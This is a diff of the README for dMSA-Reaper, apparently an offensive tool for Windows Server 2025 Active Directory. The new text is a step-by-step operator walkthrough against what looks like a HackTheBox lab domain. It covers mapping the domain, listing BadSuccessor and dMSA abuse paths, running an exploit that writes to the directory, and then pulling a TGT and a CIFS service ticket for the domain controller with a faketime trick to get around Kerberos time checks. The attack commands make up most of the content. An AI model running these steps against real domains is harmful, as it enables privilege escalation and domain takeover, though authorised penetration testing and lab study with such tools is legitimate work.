@@ -1,6 +1,6 @@
 # dMSA-Reaper
 
-dMSA-Reaper maps and exercises BadSuccessor and dMSA Ouroboros paths in
+dMSA-Reaper maps and exploits BadSuccessor and dMSA Ouroboros paths in
 Windows Server 2025 Active Directory.
 
 ## Install
@@ -28,29 +28,81 @@ Multiple paths: narrow with `--path`, `--primitive`, or `--container-dn`.
 
 ## Recon a domain first
 
+Set your target once so the commands below stay short.
+
 ```bash
-dmsa-reaper map -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps
-
-dmsa-reaper paths --state state.json          # --legacy for unpatched DCs
-
-dmsa-reaper exploit --state state.json --path BS-7f31... --dry-run
-
-dmsa-reaper exploit --state state.json --path BS-7f31... --confirm \
-  -d corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps   # same account/DC as map
+export DOMAIN=checkpoint.htb
+export DC_IP=10.0.0.10
+export DC_HOST=DC01.checkpoint.htb
+export USER=analyst
+export PASS='pass'
 ```
+
+Map the domain. This writes `state.json` and reports what it found.
+
+```bash
+dmsa-reaper map -d "$DOMAIN" --dc-ip "$DC_IP" --dc-host "$DC_HOST" \
+  -u "$USER" -p "$PASS"
+```
+
+![map](utils/1-map.png)
+
+List the abuse paths in that state. Add `--legacy` for unpatched DCs.
+
+```bash
+dmsa-reaper paths --state state.json
+```
+
+![paths](utils/2-paths.png)
+
+Dry-run a path to see every write before making it. Use the ID from the table.
+
+```bash
+dmsa-reaper exploit --state state.json --path BS-5d5dbcaecb67 --dry-run
+```
+
+![exploit dry run](utils/3-exploit-dry-run.png)
+
+Run it for real. Pass the same account and DC you used for `map`.
+
+```bash
+dmsa-reaper exploit \
+  --state state.json \
+  --path BS-5d5dbcaecb67 \
+  --confirm \
+  -d "$DOMAIN" --dc-ip "$DC_IP" --dc-host "$DC_HOST" \
+  -u "$USER" -p "$PASS"
+```
+
+![exploit confirm](utils/4-exploit-confirm.png)
 
 ## Tickets
 
-Either form prints an operation ID.
+`exploit` prints an operation ID. Use it to get tickets for the new dMSA.
+
+The `faketime` wrapper sets your clock to the DC so Kerberos does not reject the
+request for time skew.
+
+Get its TGT:
 
 ```bash
-dmsa-reaper tgt --op OP-YYYYMMDD-deadbeef \
-  --ccache /secure/operator.ccache --identity analyst
-
-dmsa-reaper ticket --op OP-YYYYMMDD-deadbeef \
-  --ccache /secure/operator.ccache --identity analyst \
-  --spn cifs/dc01.corp.local
+faketime "$(rdate -n "$DC_IP" -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" \
+  dmsa-reaper tgt --op OP-20260805-1363231c \
+  --ccache "$PWD/user-ticket.ccache" --identity "$USER"
 ```
+
+![tgt](utils/5-tgt.png)
+
+Get a service ticket for an SPN:
+
+```bash
+faketime "$(rdate -n "$DC_IP" -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" \
+  dmsa-reaper ticket --op OP-20260805-1363231c \
+  --ccache "$PWD/user-ticket.ccache" --identity "$USER" \
+  --spn 'cifs/DC01.checkpoint.htb'
+```
+
+![ticket](utils/6-ticket.png)
 
 Artifacts land under `.reaper/runs/<operation-id>/`; each SPN gets its own
 cache and handoff script.
